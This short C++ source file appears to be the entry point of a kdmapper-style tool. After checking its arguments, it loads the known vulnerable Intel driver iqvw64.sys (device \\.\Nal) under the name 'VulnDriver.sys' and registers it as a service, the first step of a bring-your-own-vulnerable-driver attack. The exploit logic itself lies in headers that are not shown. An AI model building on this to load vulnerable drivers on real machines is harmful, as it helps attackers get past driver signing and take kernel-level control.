#include <iostream>
#include "drivers_data.h"
#include "parameter_handling.h"
#include "vulndriver.h"
#include "utils.h"


int main(int argc, char* argv[]){
	HANDLE VulnHandle = INVALID_HANDLE_VALUE;
	NTSTATUS Status = 0;


	// Validate parameters:
	if (!ValidateParameters(argc, argv)) {
		return 0;
	}
	printf("[+] Provided command line parameters are valid!\n");


	// Load vulnurable driver into memory:
	Status = VulnurableDriver::LoadVulnurableDriver(&VulnHandle, L"VulnDriver.sys", "\\\\.\\Nal", "VulnService", KdmDriverData);
	if (Status != STATUS_SUCCESS) {
		printf("[-] Loading vulnurable driver procedure of kdmapper vulnurable driver (iqvw64.sys) failed with status 0x%x\n", Status);
		return 0;
	}
}